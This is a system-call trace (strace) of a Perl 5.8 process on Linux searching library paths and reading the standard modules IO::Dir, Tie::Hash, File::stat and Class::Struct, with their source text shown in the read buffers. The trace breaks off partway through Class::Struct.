5352  07:08:43.642347 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.642359 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.642378 read(10, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
5352  07:08:43.643473 stat64("/etc/perl/Tie/Hash.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.643490 stat64("/etc/perl/Tie/Hash.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.643504 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.643529 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.643574 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.643587 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.643618 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.643647 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.643659 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.643675 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.643688 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.643700 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.643714 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.643726 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
5352  07:08:43.643747 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.643762 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.643773 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.643791 read(11, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
5352  07:08:43.644212 read(11, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
5352  07:08:43.644798 read(11, "", 4096) = 0
5352  07:08:43.644815 close(11)         = 0
5352  07:08:43.644847 stat64("/etc/perl/File/stat.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.644863 stat64("/etc/perl/File/stat.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.644877 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.644890 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.644904 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.644917 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.644931 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.644943 stat64("/usr/lib/perl5/File/stat.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.644956 stat64("/usr/share/perl5/File/stat.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.644969 stat64("/usr/share/perl5/File/stat.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.644982 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.644995 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.645009 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.645022 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
5352  07:08:43.645044 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.645059 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.645070 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.645100 read(11, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
5352  07:08:43.645517 stat64("/etc/perl/Class/Struct.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645535 stat64("/etc/perl/Class/Struct.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645550 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645563 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645591 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645607 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645661 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645692 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645705 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645734 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645748 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645761 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfd2e83c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645775 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfd2e92c) = -1 ENOENT (No such file or directory)
5352  07:08:43.645788 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
5352  07:08:43.645810 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 12
5352  07:08:43.645825 ioctl(12, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2e648) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.645837 _llseek(12, 0, [0], SEEK_CUR) = 0
5352  07:08:43.645856 read(12, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
5352  07:08:43.646267 brk(0x82de000)    = 0x82de000
5352  07:08:43.663521 read(12, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], 